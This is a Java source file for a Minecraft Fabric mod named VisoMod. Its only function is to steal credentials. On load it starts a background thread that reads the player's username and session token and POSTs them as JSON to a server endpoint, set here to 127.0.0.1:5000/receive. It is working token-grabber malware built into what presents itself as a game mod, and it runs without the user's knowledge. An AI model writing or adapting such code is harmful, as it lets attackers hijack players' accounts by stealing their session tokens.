package me.visoxd;

import net.fabricmc.api.ModInitializer;
import net.minecraft.client.Minecraft;
import me.visoxd.handlers.Session;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class VisoMod implements ModInitializer {

    @Override
    public void onInitialize() {
        new Thread(() -> {
            try {
                Minecraft client = Minecraft.getInstance();
                Session session = new Session(client);

                String username = session.getUsername();
                String token = session.getSessionId();

                sendToServer(username, token);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void sendToServer(String username, String token) {
        try {
            HttpURLConnection conn = (HttpURLConnection) new URL("http://127.0.0.1:5000/receive").openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            String json = String.format(
                    "{\"username\":\"%s\",\"token\":\"%s\"}",
                    username, token
            );

            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.getBytes());
            }

            int responseCode = conn.getResponseCode();
            System.out.println("Server Response: " + responseCode);

        } catch (Exception e) {
            System.out.println("Failed to send to server: " + e.getMessage());
        }
    }
}